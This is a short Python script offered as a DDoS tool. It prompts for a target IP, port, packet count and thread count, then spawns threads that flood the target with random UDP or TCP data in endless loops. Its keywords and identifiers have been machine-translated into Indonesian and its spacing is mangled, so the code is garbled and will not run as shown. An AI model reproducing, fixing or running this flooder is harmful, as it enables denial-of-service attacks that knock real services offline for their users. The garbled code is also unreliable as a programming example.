#!/usr/bin/env python3
#Kode oleh Diego
impor  acak
 soket impor
 benang impor

print ( "~~~ DDOS TOOLS Oleh Diego ~~~" )
print ( "~~~ Kode dan Ditulis oleh Diego ~~~" )
print ( "~~~ Script ini dibuat hanya untuk Diego Pribadi. ~~~" )
print ( "~~~ DDOS dibuat hanya Have Fun. ~~~" )
ip  =  str ( masukan ( "Ip Target:" ))
port  =  int ( input ( "Port Target:" ))
pilihan  =  str ( masukan ( " UDP(y/n):" ))
times  =  int ( input ( "Paket yang dikirim ke target:" ))
thread  =  int ( input ( " Thread yang dikirim:" ))
 menjalankan def ():
	data  =  acak . _urandom ( 1024 )
	saya  =  acak . pilihan (( "[*]" , "[!]" , "[#]" ))
	sedangkan  Benar :
		coba :
			s  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
			addr  = ( str ( ip ), int ( port ))
			untuk  x  dalam  rentang ( kali ):
				s . kirim ke ( data , addr )
			print ( i  + " assamulaikum paket!!" )
		kecuali :
			print ( "[!] yah dibuang!!!" )

def  run2 ():
	data  =  acak . _urandom ( 16 )
	saya  =  acak . pilihan (( "[*]" , "[!]" , "[#]" ))
	sedangkan  Benar :
		coba :
			s  =  soket . soket ( soket . AF_INET , soket . SOCK_STREAM )
			s . menghubungkan (( ip , port ))
			s . kirim ( data )
			untuk  x  dalam  rentang ( kali ):
				s . kirim ( data )
			print ( i  + " Assamulaikum Pakect" )
		kecuali :
			s . tutup ()
			print ( "[*] Yah dibuang" )
            
untuk  y  dalam  jangkauan ( utas ):
	jika  pilihan  ==  'y' :
		th  =  benang . Utas ( target  =  lari )
		th . mulai ()
	lain :
		th  =  benang . Utas ( target  =  run2 )
		th . mulai ()